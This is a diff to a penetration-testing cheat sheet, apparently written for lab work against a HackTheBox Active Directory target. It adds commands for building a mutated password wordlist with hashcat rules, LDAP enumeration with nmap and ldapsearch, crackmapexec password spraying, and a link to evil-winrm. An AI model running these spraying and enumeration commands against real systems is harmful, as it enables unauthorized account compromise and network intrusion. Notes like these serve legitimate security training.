@@ -39,6 +39,38 @@
 
 # Misc
 
+## create password list
+* create text file with keywords
+```bash
+January 
+February
+March
+April
+May
+June
+July
+August
+September
+October
+November
+December
+Autumn
+Spring
+Fall
+Summer
+Winter
+Password
+Forest
+Secret
+```
+```bash
+for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; echo ${i}2020; echo ${i}2019; done > tmp
+mv tmp pwlist.txt
+
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule -r /usr/share/hashcat/rules/toggles1.rule   > tmp
+mv tmp pwlist.txt
+```
+
 ## Automated IP Lookup
 ```bash
 ~/mfu# curl -s https://api.greynoise.io/v3/community/8.8.8.8 | python3 -m json.tool
@@ -250,6 +282,24 @@ Open a second terminal and run:
 ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
+## ldap enumeration
+```bash
+# get base domain name with nmap
+nmap -n -sV --script "ldap* and not brute" 10.10.10.161
+nmap -p 389 --script ldap-rootdse -Pn 10.10.10.161
+nmap -p 389 --script ldap-search -Pn 10.10.10.161
+
+# get information
+ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"  
+```
+
+## password spraying
+* get the domain password policy first to check lockout policy
+```bash
+crackmapexec smb 10.10.10.161 --pass-pol
+crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
+```
+
 ## Shell Access with Credentials
 
 :information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
@@ -257,6 +307,9 @@ ntlmrelayx.py -tf targets.txt -smb2support
 ``` bash
 psexec.py whiterose.local/ealderson:Password!@192.168.92.129
 ```
+
+* https://github.com/Hackplayers/evil-winrm
+
 
 ## IPv6 Attacks
 
